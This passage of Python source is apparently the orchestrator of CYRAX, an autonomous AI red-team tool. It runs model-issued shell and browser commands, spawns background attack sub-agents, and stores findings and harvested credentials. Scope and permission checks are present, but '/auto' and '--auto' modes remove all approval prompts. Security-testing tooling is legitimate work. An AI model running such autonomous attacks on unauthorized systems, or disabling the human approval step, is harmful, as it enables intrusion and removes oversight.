                                    self._record_failure(command, br_result.error or br_result.output)
                            except Exception as e:
                                error_msg = f"Browser error: {e}"
                                display.show_tool_output("CYRAX", error_msg)
                                guidance = _get_failure_guidance(command, str(e))
                                action_results.append(
                                    f"[Tool Result for: {command}]\nError: {error_msg}\n{guidance}"
                                )
                                self._record_failure(command, str(e))
                        else:
                            # Method doesn't exist — provide full valid method list
                            valid_methods = ", ".join(sorted(BROWSER_COMMANDS.keys()))
                            error_msg = (
                                f"Error: '{method_name}' is not a valid browser method.\n"
                                f"Valid methods: {valid_methods}\n"
                                f"For SQL injection testing, use sqlmap or write a Python script."
                            )
                            display.show_tool_output("CYRAX", error_msg)
                            action_results.append(
                                f"[Tool Result for: {command}]\n{error_msg}"
                            )
                            self._record_failure(command, error_msg)
                    elif is_browser_command(command):
                        method_match = re.match(r"browser\.(\w+)\(", command)
                        bad_method = method_match.group(1) if method_match else "unknown"
                        valid_methods = ", ".join(sorted(BROWSER_COMMANDS.keys()))
                        error_msg = (
                            f"Error: 'browser.{bad_method}()' does not exist.\n"
                            f"Valid methods: {valid_methods}\n"
                            f"Do NOT invent browser methods."
                        )
                        display.show_tool_output("CYRAX", error_msg)
                        action_results.append(
                            f"[Tool Result for: {command}]\n{error_msg}"
                        )
                        self._record_failure(command, error_msg)
                    else:
                        # Shell command — scope check
                        scope_ok, scope_reason = self.scope.check_command(command)
                        if not scope_ok:
                            scope_msg = f"[Scope Violation] {scope_reason}"
                            display.show_tool_output("CYRAX", scope_msg)
                            action_results.append(f"[Tool Result for: {command}]\n{scope_msg}")
                            continue

                        # Permission check
                        perm_ok, perm_reason = self.permission_gate.check(command)
                        if not perm_ok:
                            perm_msg = f"[Permission Denied] {perm_reason}"
                            display.show_tool_output("CYRAX", perm_msg)
                            action_results.append(f"[Tool Result for: {command}]\n{perm_msg}")
                            continue

                        with display.get_spinner("Executing..."):
                            result = self.tools.execute_raw(command)
                        display.show_tool_output("CYRAX", result.output)
                        self.logger.log_command("CYRAX", command, result.output, result.exit_code)
                        if result.success:
                            action_results.append(
                                f"[Tool Result for: {command}]\n"
                                f"Exit code: {result.exit_code}\n"
                                f"Output:\n{result.output}"
                            )
                            self._consecutive_cmd_failures = 0
                            self._cmds_succeeded_this_turn += 1
                        else:
                            guidance = _get_failure_guidance(command, result.output)
                            action_results.append(
                                f"[Tool Result for: {command}]\n"
                                f"Exit code: {result.exit_code}\n"
                                f"Output:\n{result.output}\n"
                                f"NOTE: This command failed. Do NOT retry it. "
                                f"Analyze the error and try a different approach.{guidance}"
                            )
                            self._record_failure(command, result.output)

            elif action_type == "spawn":
                agent_type = match.group(1)
                task = match.group(2).strip()
                report = self._spawn_and_run_agent(agent_type, task)
                if report:
                    if report.get("status") == "spawned":
                        # Non-blocking: agent is running in background
                        action_results.append(
                            f"[Agent {report['agent_id']} Spawned]\n"
                            f"Status: running in background (PID will be assigned)\n"
                            f"Task: {report['task']}\n"
                            f"The agent will report findings via IPC as they are discovered. "
                            f"Use [KILL agent=\"{report['agent_id']}\"] to stop it."
                        )
                    else:
                        action_results.append(
                            f"[Agent {report['agent_id']} Report]\n"
                            f"Status: {report['status']}\n"
                            f"Summary: {report['summary']}"
                        )

            elif action_type == "kill":
                target_agent = match.group(1).strip()
                reason = match.group(2) or "Orchestrator requested kill"
                killed = self.agent_pool.kill(target_agent, graceful=True, timeout=10.0)
                if killed:
                    display.show_info(f"Agent {target_agent} killed: {reason}")
                    action_results.append(
                        f"[Agent Kill Result]\n"
                        f"Agent {target_agent} has been terminated. Reason: {reason}"
                    )
                else:
                    action_results.append(
                        f"[Agent Kill Result]\n"
                        f"Agent {target_agent} not found or already terminated."
                    )

            elif action_type == "store":
                category = match.group(1)
                key = match.group(2)
                data_str = match.group(3).strip()
                try:
                    data = {"raw": data_str}
                    self.knowledge.store(category, key, data)
                    self.logger.info(f"Stored data: {category}/{key}")
                except Exception as e:
                    self.logger.log_error("CYRAX", f"Failed to store data: {e}")

            elif action_type == "finding":
                severity = match.group(1)
                title = match.group(2)
                details = match.group(3).strip()

                # Fabricated finding prevention: check if any commands
                # actually succeeded to back up this finding
                if self._cmds_succeeded_this_turn == 0 and self._actions_executed_this_turn > 0:
                    display.show_warning(
                        f"Finding '{title}' may be fabricated — no commands succeeded this turn. "
                        f"Findings must be backed by actual command output."
                    )
                    action_results.append(
                        f"[Action Feedback] WARNING: Your finding '{title}' appears fabricated. "
                        f"All {self._actions_executed_this_turn} commands executed this turn FAILED. "
                        f"Do NOT report findings without successful command output as evidence. "
                        f"Run commands, verify results, THEN report findings."
                    )
                    continue

                display.show_finding(severity, title, details)
                self.knowledge.store_finding(
                    title=title,
                    severity=severity,
                    description=details,
                    target=self.campaign.target,
                    target_url_host=self.campaign.target,
                )
                self.logger.log_finding("CYRAX", severity, title, details)
                self.mission.add_vuln(title, url=self.campaign.target,
                                      evidence=details[:100])

        return action_results

    def _spawn_and_run_agent(self, agent_type: str, task: str) -> Optional[dict]:
        """Spawn a specialized sub-agent as a separate subprocess (non-blocking)."""
        if agent_type not in AGENT_CLASSES:
            self.logger.log_error(
                "CYRAX", f"Unknown agent type: {agent_type}"
            )
            display.show_error(f"Unknown agent type: {agent_type}")
            return None

        count = self.agent_counter.get(agent_type, 0)
        self.agent_counter[agent_type] = count + 1
        agent_id = f"{agent_type.upper()}-{count:02d}"

        display.show_spawning_agent(agent_id, agent_type, task)
        self.logger.log_agent_spawn("CYRAX", agent_id, agent_type, task)

        # Update mission memory with latest browser state before briefing
        self.mission.extract_from_browser(self.browser)
        self.mission.register_agent(agent_id, agent_type, task)

        # Build mission briefing for the sub-agent
        mission_briefing = self.mission.build_agent_briefing(agent_type, task)

        # Build configs for the subprocess
        model_config = {
            "provider": self.model.provider,
            "model_name": self.model.model_name,
            "temperature": self.model.temperature,
            "max_tokens": self.model.max_tokens,
        }
        tool_config = {
            "work_dir": str(self.tools.executor.work_dir),
            "timeout": self.tools.executor.timeout,
            "allow_dangerous": self.tools.executor.allow_dangerous,
        }
        scope_config = {
            "enabled": self.scope.enabled,
            "raw_targets": self.scope._raw_targets if self.scope.enabled else [],
        }
        permission_config = {
            "auto_approve": self.permission_gate.auto_approve,
            "session_approvals": dict(self.permission_gate.session_approvals),
        }

        # Spawn subprocess via pool (non-blocking — returns immediately)
        self.agent_pool.spawn(
            agent_id=agent_id,
            agent_type=agent_type,
            task=task,
            model_config=model_config,
            tool_config=tool_config,
            scope_config=scope_config,
            permission_config=permission_config,
            mission_briefing=mission_briefing,
            mission_memory_snapshot=self.mission.to_dict(),
            campaign_dir=str(self._campaign_dir) if self._campaign_dir else "",
        )

        # Register in campaign state with PID info (PID comes via IPC later)
        self.campaign.register_agent(agent_id, agent_type, task)

        # Return placeholder — agent is running in background
        return {
            "agent_id": agent_id,
            "task": task,
            "status": "spawned",
            "iterations": 0,
            "summary": (
                f"Agent {agent_id} spawned as background process. "
                f"It will report findings as they are discovered."
            ),
            "findings": [],
        }

    def receive_agent_update(self, agent_id: str, update: str):
        """Receive an interim update from a sub-agent."""
        display.show_agent_message(agent_id, update)
        self.logger.log_event(
            "agent_update", agent_id, {"update": update[:500]}
        )

    def _on_agent_finding(self, agent_id: str, finding: dict):
        """Callback: agent discovered a finding via IPC."""
        severity = finding.get("severity", "info")
        title = finding.get("title", "Untitled finding")
        details = finding.get("details", finding.get("description", ""))
        display.show_finding(severity, f"[{agent_id}] {title}", details)
        self.knowledge.store_finding(
            title=f"[{agent_id}] {title}",
            severity=severity,
            description=details,
            target=self.campaign.target,
            agent_id=agent_id,
            target_url_host=self.campaign.target,
        )
        self.logger.log_finding(agent_id, severity, title, details)
        self.mission.add_vuln(title, url=self.campaign.target,
                              evidence=details[:100])

    def _on_agent_report(self, agent_id: str, update: str):
        """Callback: agent sent a status report/update via IPC."""
        display.show_agent_message(agent_id, update)
        self.logger.log_event("agent_report", agent_id, {"update": update[:500]})

    def _on_agent_permission_request(self, agent_id: str, request: dict):
        """Callback: agent needs permission to execute a command."""
        command = request.get("command", "")
        request_id = request.get("request_id", "")
        display.show_info(
            f"Agent {agent_id} requests permission: {command[:100]}"
        )

        # Check with our local permission gate
        allowed, reason = self.permission_gate.check(command)
        self.agent_pool.respond_permission(agent_id, request_id, allowed, reason)

        if not allowed:
            display.show_info(f"Permission denied for {agent_id}: {reason}")

    def _on_agent_complete(self, agent_id: str, report: dict):
        """Callback: agent subprocess finished."""
        status = report.get("status", "unknown")
        summary = report.get("summary", "No summary")
        findings = report.get("findings", [])

        display.show_info(
            f"Agent {agent_id} completed ({status}): "
            f"{len(findings)} findings. {summary[:120]}"
        )

        # Store the report
        self.agent_reports.append(report)

        # Register findings that weren't already sent via IPC
        for finding in findings:
            if isinstance(finding, dict) and finding.get("title"):
                self.knowledge.store_finding(
                    title=f"[{agent_id}] {finding['title']}",
                    severity=finding.get("severity", "info"),
                    description=finding.get("details", finding.get("description", "")),
                    target=self.campaign.target,
                    agent_id=agent_id,
                    target_url_host=self.campaign.target,
                )

        # Update campaign state
        self.campaign.update_agent_status(agent_id, status)
        self.mission.update_agent(agent_id, status)

        self.logger.log_event("agent_complete", agent_id, {
            "status": status,
            "findings_count": len(findings),
            "summary": summary[:200],
        })

    def _reconnect_orphaned_agents(self):
        """Reconnect to orphaned agent processes from a previous session (daemon mode)."""
        if not self._campaign_dir:
            return
        orphaned = self.campaign.get_orphaned_agents()
        if not orphaned:
            return
        reconnected = 0
        for agent_info in orphaned:
            agent_id = agent_info.get("agent_id", "")
            pid = agent_info.get("pid", 0)
            socket_path = agent_info.get("socket_path", "")
            if agent_id and pid:
                success = self.agent_pool.reconnect_agent(
                    agent_id, pid, agent_info, socket_path,
                )
                if success:
                    reconnected += 1
                    display.show_info(
                        f"Reconnected to orphaned agent {agent_id} (PID {pid})"
                    )
        if reconnected:
            display.show_info(f"Reconnected to {reconnected} orphaned agent(s)")

    def _poll_completed_agents(self) -> list[str]:
        """Poll for completed agent reports and return feedback strings."""
        completed = self.agent_pool.get_completed()
        feedback = []
        for report in completed:
            agent_id = report.get("agent_id", "unknown")
            status = report.get("status", "unknown")
            summary = report.get("summary", "No summary")
            findings = report.get("findings", [])
            finding_text = ""
            if findings:
                finding_lines = []
                for f in findings[:10]:
                    if isinstance(f, dict):
                        finding_lines.append(
                            f"  - [{f.get('severity', '?')}] {f.get('title', 'untitled')}"
                        )
                finding_text = "\nFindings:\n" + "\n".join(finding_lines)
            feedback.append(
                f"[Agent {agent_id} Completed]\n"
                f"Status: {status}\n"
                f"Summary: {summary}{finding_text}"
            )
        return feedback

    def request_pause(self):
        """Request a pause in the current operation (called from TUI)."""
        self._pause_requested = True

    def queue_user_message(self, message: str):
        """Queue a message to send on the next turn (replaces auto-continue)."""
        self._queued_user_message = message

    def handle_command(self, user_input: str) -> Optional[str]:
        """Handle special user commands (prefixed with /)."""
        cmd = user_input.strip().lower()
        parts = user_input.strip().split(maxsplit=1)
        cmd_name = parts[0].lower() if parts else ""
        cmd_args = parts[1] if len(parts) > 1 else ""

        if cmd in ("/exit", "/quit", "/q", "/bye"):
            return "EXIT"

        if cmd == "/pause":
            if self._campaign_mode:
                self.campaign.status = "paused"
                self._save_campaign_state()
                display.show_success(
                    f"Campaign '{self._campaign_name}' paused and saved to {self._campaign_dir}/"
                )
                return "EXIT"
            else:
                display.show_info("Not in campaign mode. Use /exit to quit.")
                return ""

        if cmd == "/status":
            display.show_campaign_status(self.campaign.to_dict())
            return ""

        if cmd == "/agents":
            pool_status = self.agent_pool.get_status()
            if pool_status:
                for aid, info in pool_status.items():
                    display.show_info(
                        f"{aid} (PID {info['pid']}): {info['status']} - "
                        f"iter {info['iteration']} - {info['task']}"
                    )
            else:
                display.show_info("No agents spawned yet.")
            return ""

        if cmd_name == "/kill":
            if cmd_args:
                target_id = cmd_args.strip().upper()
                killed = self.agent_pool.kill(target_id, graceful=True, timeout=10.0)
                if killed:
                    display.show_success(f"Agent {target_id} killed.")
                else:
                    display.show_error(f"Agent {target_id} not found or already terminated.")
            else:
                display.show_info("Usage: /kill <agent_id>")
            return ""

        if cmd == "/killall":
            running = self.agent_pool.get_running()
            if running:
                self.agent_pool.kill_all(graceful=True)
                display.show_success(f"Killed {len(running)} agent(s).")
            else:
                display.show_info("No agents currently running.")
            return ""

        if cmd == "/dashboard":
            if self.agent_pool._tmux_enabled:
                display.show_info(
                    f"Tmux dashboard: tmux attach -t cyrax-{self._session_id}"
                )
            else:
                display.show_info(
                    "Tmux not available. Agent status:\n"
                )
                pool_status = self.agent_pool.get_status()
                for aid, info in pool_status.items():
                    display.show_info(
                        f"  {aid}: {info['status']} (PID {info['pid']}) "
                        f"iter {info['iteration']}"
                    )
            return ""

        if cmd == "/findings":
            findings = self.knowledge.get_findings()
            if findings:
                for f in findings:
                    display.show_finding(
                        f["severity"], f["title"], f["description"]
                    )
            else:
                display.show_info("No findings recorded yet.")
            return ""

        if cmd == "/credentials" or cmd == "/creds":
            creds = self.knowledge.get_credentials()
            if creds:
                for c in creds:
                    display.show_info(
                        f"{c['username']}:{c.get('password', '***')} "
                        f"@ {c.get('target', 'N/A')} "
                        f"(source: {c.get('source', 'N/A')})"
                    )
            else:
                display.show_info("No credentials found yet.")
            return ""

        if cmd == "/hosts":
            hosts = self.knowledge.get_hosts()
            if hosts:
                for h in hosts:
                    display.show_info(
                        f"{h['hostname']} ({h.get('ip', '?')}) "
                        f"ports: {h.get('ports', [])}"
                    )
            else:
                display.show_info("No hosts discovered yet.")
            return ""

        if cmd == "/usage":
            usage = self.model.get_usage()
            display.show_info(
                f"Model: {usage['provider']}/{usage['model']}\n"
                f"Tokens in: {usage['total_tokens_in']}\n"
                f"Tokens out: {usage['total_tokens_out']}\n"
                f"Total: {usage['total_tokens']}"
            )
            return ""

        if cmd_name == "/scope":
            if cmd_args:
                self._configure_scope(cmd_args)
                display.show_success(f"Scope updated: {self.scope.get_scope_description()}")
            else:
                display.show_info(f"Current scope: {self.scope.get_scope_description()}")
            return ""

        if cmd_name == "/approve":
            if cmd_args:
                self.permission_gate.approve_category(cmd_args)
                display.show_success(f"Pre-approved action category: {cmd_args}")
            else:
                cats = ", ".join(PermissionGate.ACTIONS.keys())
                display.show_info(f"Usage: /approve <category>\nCategories: {cats}")
            return ""

        if cmd == "/auto":
            self.permission_gate.auto_approve_all()
            display.show_success("Fully autonomous mode enabled. No more permission prompts.")
            return ""

        if cmd == "/export":
            self._export_findings()
            return ""

        if cmd == "/help":
            display.show_info(
                "Available commands:\n"
                "  /status     - Show campaign status\n"
                "  /agents     - List active agents (with PID and iteration)\n"
                "  /kill <id>  - Kill a specific agent by ID\n"
                "  /killall    - Kill all running agents\n"
                "  /dashboard  - Show tmux dashboard attach command\n"
                "  /findings   - Show all findings\n"
                "  /creds      - Show discovered credentials\n"
                "  /hosts      - Show discovered hosts\n"
                "  /usage      - Show model token usage\n"
                "  /scope [t]  - Show or set target scope\n"
                "  /approve c  - Pre-approve an action category\n"
                "  /auto       - Enable fully autonomous mode (no permission prompts)\n"
                "  /export     - Export findings to report file\n"
                "  /pause      - Save campaign state and exit\n"
                "  /help       - Show this help\n"
                "  /exit       - Exit CYRAX\n"
                "\nOtherwise, just type naturally to interact with CYRAX."
            )
            return ""

        return None

    def _export_findings(self):
        """Export findings to a markdown report file."""
        findings = self.knowledge.get_findings()
        if not findings:
            display.show_info("No findings to export.")
            return

        report_path = self.tools.executor.work_dir / "cyrax_report.md"
        lines = [
            f"# CYRAX Security Assessment Report",
            f"",
            f"**Target:** {self.campaign.target or 'N/A'}",
            f"**Campaign:** {self._campaign_name or 'N/A'}",
            f"**Findings:** {len(findings)}",
            f"",
            f"---",
            f"",
        ]
        for i, f in enumerate(findings, 1):
            lines.extend([
                f"## {i}. [{f['severity'].upper()}] {f['title']}",
                f"",
                f"- ID: {f.get('id', 'N/A')}",
                f"- Timestamp: {f.get('stored_at', 'N/A')}",
                f"- Agent: {f.get('agent_id', 'N/A') or 'N/A'}",
                f"- Target: {f.get('target_url_host', f.get('target', 'N/A')) or 'N/A'}",
                f"- Command/Action ID: {f.get('command_action_id', 'N/A') or 'N/A'}",
                f"- Output Ref: {f.get('raw_output_ref', 'N/A') or 'N/A'}",
                f"",
                f"{f['description']}",
                f"",
                f"---",
                f"",
            ])

        report_path.write_text("\n".join(lines))
        display.show_success(f"Report exported to {report_path}")

    def _threaded_chat(self, user_input: str):
        """Run chat in a thread. Stores result/error for the main thread."""
        try:
            self._chat_result = self.chat(user_input)
        except Exception as e:
            self._chat_error = e

    def run(self):
        """
        Main interactive loop with threaded AI execution.
        The AI runs in a background thread so the user can Ctrl+C to interrupt.
        """
        display.show_banner()

        if self._campaign_mode:
            display.show_cyrax_message(
                f"Campaign '{self._campaign_name}' active. "
                f"Objective: {self.campaign.objective or 'Not set'}\n"
                f"Depth limit: {self._max_response_depth} iterations/turn. "
                f"Use /pause to save and exit."
            )
        else:
            display.show_cyrax_message(
                "Ready. What's the target?\n"
                "  Ctrl+C to interrupt  |  /help for commands  |  /exit to quit"
            )

        turn_count = 0
        while True:
            # In campaign mode after the first turn, auto-continue
            if (
                self._campaign_mode
                and turn_count > 0
                and self.campaign.status == "active"
            ):
                # Stall detection: 3 consecutive turns with zero actions
                if self._consecutive_empty_turns >= 3:
                    display.show_warning(
                        "3 consecutive turns with no commands executed. "
                        "The AI may need guidance. Type a message to redirect, or /pause to stop."
                    )
                    user_input = display.prompt_user()
                    if not user_input or user_input.strip().lower() in ("exit", "/exit"):
                        self.campaign.status = "paused"
                        self._save_campaign_state()
                        break
                    self._consecutive_empty_turns = 0
                else:
                    if self._queued_user_message:
                        user_input = self._queued_user_message
                        self._queued_user_message = None
                    else:
                        user_input = "Continue."
                    display.show_info(f"[Turn {turn_count + 1}]")

                    if turn_count % 5 == 0 and turn_count > 0:
                        findings = self.knowledge.get_findings()
                        display.show_info(
                            f"Findings: {len(findings)} | "
                            f"Hosts: {len(self.campaign.compromised_hosts)} | "
                            f"Agents: {len(self.agents)}"
                        )
            else:
                user_input = display.prompt_user()

            if not user_input or not user_input.strip():
                continue

            # Handle slash commands and exit aliases
            stripped = user_input.strip()
            if stripped.lower() in ("/bye", "/quit", "/q"):
                stripped = "/exit"
            if stripped.startswith("/"):
                result = self.handle_command(stripped)
                if result == "EXIT":
                    if self._campaign_mode:
                        self._save_campaign_state()
                        display.show_cyrax_message("Campaign state saved. Ending session.")
                    else:
                        display.show_cyrax_message("Ending session. Stay sharp.")
                    break
                if result is not None:
                    continue

            # Run AI in background thread so Ctrl+C interrupts cleanly
            self._chat_result = None
            self._chat_error = None
            ai_thread = threading.Thread(
                target=self._threaded_chat, args=(user_input,), daemon=True
            )
            ai_thread.start()

            try:
                while ai_thread.is_alive():
                    ai_thread.join(timeout=0.3)
            except KeyboardInterrupt:
                self.request_pause()
                display.show_warning(
                    "\nInterrupting after current action... "
                    "(Ctrl+C again to force quit)"
                )
                try:
                    ai_thread.join(timeout=15)
                except KeyboardInterrupt:
                    if self._campaign_mode:
                        self._save_campaign_state()
                        display.show_cyrax_message("Campaign state saved. Ending session.")
                    else:
                        display.show_cyrax_message("Force quit. Ending session.")
                    break

            if self._chat_error:
                display.show_error(f"AI error: {self._chat_error}")

            turn_count += 1

            # Track actions for auto-continue
            self._turn_action_counts.append(self._actions_executed_this_turn)
            if self._actions_executed_this_turn == 0:
                self._consecutive_empty_turns += 1
            else:
                self._consecutive_empty_turns = 0

            # Poll for completed agent reports and queue them for the next turn
            agent_feedback = self._poll_completed_agents()
            if agent_feedback:
                combined_feedback = "\n\n".join(agent_feedback)
                self.conversation.add_message(
                    "user", f"[Agent Reports]\n{combined_feedback}"
                )

            if self._campaign_mode:
                self._save_campaign_state()

    def shutdown(self):
        """Clean up resources: agents, browser, DB, logs."""
        try:
            running = self.agent_pool.get_running()
            self.agent_pool.shutdown(wait=bool(running))
        except Exception:
            pass
        if self.browser:
            self.browser.close()
        self.knowledge.close()
        self.logger.close()


def load_config(config_path: Optional[str] = None) -> dict:
    """Load configuration from YAML file."""
    if config_path:
        path = Path(config_path)
    else:
        candidates = [
            Path("config/config.yaml"),
            Path("config.yaml"),
            Path.home() / ".cyrax" / "config.yaml",
        ]
        path = None
        for candidate in candidates:
            if candidate.exists():
                path = candidate
                break

    if path and path.exists():
        with open(path) as f:
            return yaml.safe_load(f)

    return {
        "model": {
            "provider": "anthropic",
            "api_key": os.environ.get("ANTHROPIC_API_KEY", ""),
            "model_name": "claude-sonnet-4-20250514",
            "temperature": 0.7,
            "max_tokens": 4096,
        },
        "tools": {
            "timeout": 300,
            "allow_dangerous": False,
            "work_dir": get_default_work_dir(),
        },
        "memory": {
            "db_path": "data/cyrax.db",
            "max_history": 50,
        },
        "logging": {
            "log_dir": "logs",
            "level": "INFO",
        },
        "display": {
            "show_reasoning": True,
        },
        "safety": {
            "auto_approve": False,
        },
    }


def setup_interactive(config: dict) -> dict:
    """Interactive setup for first-time users."""
    from rich.prompt import Prompt, Confirm

    console = display.console

    console.print("\n[bold yellow]CYRAX First-Time Setup[/bold yellow]\n")

    provider = Prompt.ask(
        "Select model provider",
        choices=["anthropic", "openai", "google", "xai", "ollama", "lmstudio", "custom"],
        default="anthropic",
    )
    config["model"]["provider"] = provider

    if provider in ("anthropic", "openai", "google", "xai"):
        env_var_map = {
            "anthropic": "ANTHROPIC_API_KEY",
            "openai": "OPENAI_API_KEY",
            "google": "GOOGLE_API_KEY",
            "xai": "XAI_API_KEY",
        }
        env_key = os.environ.get(env_var_map.get(provider, ""), "")
        if env_key:
            console.print(f"[green]Found API key in environment ({env_var_map[provider]})[/green]")
            config["model"]["api_key"] = env_key
        else:
            api_key = Prompt.ask(f"Enter {provider} API key")
            config["model"]["api_key"] = api_key

        default_models = {
            "anthropic": "claude-sonnet-4-20250514",
            "openai": "gpt-4o",
            "google": "gemini-1.5-pro",
            "xai": "grok-2",
        }
        model_name = Prompt.ask(
            "Model name", default=default_models.get(provider, "")
        )
        config["model"]["model_name"] = model_name

    elif provider in ("ollama", "lmstudio"):
        default_urls = {
            "ollama": "http://localhost:11434",
            "lmstudio": "http://localhost:1234/v1",
        }
        api_url = Prompt.ask(
            "API URL", default=default_urls[provider]
        )
        config["model"]["api_url"] = api_url

        model_name = Prompt.ask(
            "Model name",
            default="llama3.1:70b" if provider == "ollama" else "local-model",
        )
        config["model"]["model_name"] = model_name

    elif provider == "custom":
        api_url = Prompt.ask("Custom API endpoint URL")
        api_key = Prompt.ask("API key (leave blank if none)", default="")
        model_name = Prompt.ask("Model name")
        config["model"]["api_url"] = api_url
        config["model"]["api_key"] = api_key
        config["model"]["model_name"] = model_name

    if Confirm.ask("Save configuration to config/config.yaml?", default=True):
        config_dir = Path("config")
        config_dir.mkdir(exist_ok=True)
        config_path = config_dir / "config.yaml"
        with open(config_path, "w") as f:
            yaml.dump(config, f, default_flow_style=False)
        console.print(f"[green]Config saved to {config_path}[/green]")

    return config


def main():
    parser = argparse.ArgumentParser(
        description="CYRAX - Autonomous AI Red Team Operator"
    )
    parser.add_argument(
        "--config", "-c",
        type=str,
        help="Path to configuration file",
    )
    parser.add_argument(
        "--setup",
        action="store_true",
        help="Run interactive setup",
    )
    parser.add_argument(
        "--campaign",
        type=str,
        metavar="NAME",
        help="Start or resume a named campaign",
    )
    parser.add_argument(
        "--max-depth",
        type=int,
        default=8,
        metavar="N",
        help="Max action-loop iterations per turn (default: 8)",
    )
    parser.add_argument(
        "--objective",
        type=str,
        default="",
        help="Campaign objective (used with --campaign for new campaigns)",
    )
    parser.add_argument(
        "--auto",
        action="store_true",
        help="Fully autonomous mode — no permission prompts",
    )
    parser.add_argument(
        "--scope",
        type=str,
        default="",
        help="Comma-separated list of in-scope targets (IPs, domains, CIDRs)",
    )
    parser.add_argument(
        "--tui",
        action="store_true",
        help="Launch with the Textual interactive TUI (experimental)",
    )
    parser.add_argument(
        "--simple",
        action="store_true",
        help="Force simple Rich console mode (no Textual TUI)",
    )
    args = parser.parse_args()

    config = load_config(args.config)

    # Check if setup is needed
    api_key = config.get("model", {}).get("api_key", "")
    provider = config.get("model", {}).get("provider", "")
    needs_setup = (
        args.setup
        or (provider in ("anthropic", "openai", "google", "xai") and not api_key)
        and provider not in ("ollama", "lmstudio")
    )

    if needs_setup:
        config = setup_interactive(config)

    if not config.get("model", {}).get("provider"):
        display.show_error(
            "No model provider configured. Run with --setup or create config/config.yaml"
        )
        sys.exit(1)

    # Apply auto-approve from CLI
    if args.auto:
        config.setdefault("safety", {})["auto_approve"] = True

    # Start CYRAX
    cyrax = CyraxOrchestrator(config)
    cyrax._max_response_depth = args.max_depth

    # Apply scope from CLI
    if args.scope:
        cyrax._configure_scope(args.scope)

    if args.campaign:
        cyrax.start_campaign(args.campaign, objective=args.objective)

    # Use --tui to launch the Textual interactive TUI.
    # Default is the Rich console mode (simple mode).
    use_tui = args.tui and not args.simple and sys.stdin.isatty()

    if use_tui:
        try:
            from ui.app import CyraxApp
            app = CyraxApp(cyrax)
            app.run()
        except ImportError:
            # Textual not installed — fall through to simple mode
            try:
                cyrax.run()
            except KeyboardInterrupt:
                if cyrax._campaign_mode:
                    cyrax._save_campaign_state()
                    display.show_cyrax_message("\nInterrupted. Campaign state saved.")
                else:
                    display.show_cyrax_message("\nInterrupted. Ending session.")
            finally:
                cyrax.shutdown()
    else:
        try:
            cyrax.run()
        except KeyboardInterrupt:
            if cyrax._campaign_mode:
                cyrax._save_campaign_state()
                display.show_cyrax_message("\nInterrupted. Campaign state saved.")
            else:
                display.show_cyrax_message("\nInterrupted. Ending session.")
        finally:
            cyrax.shutdown()


if __name__ == "__main__":
    main()
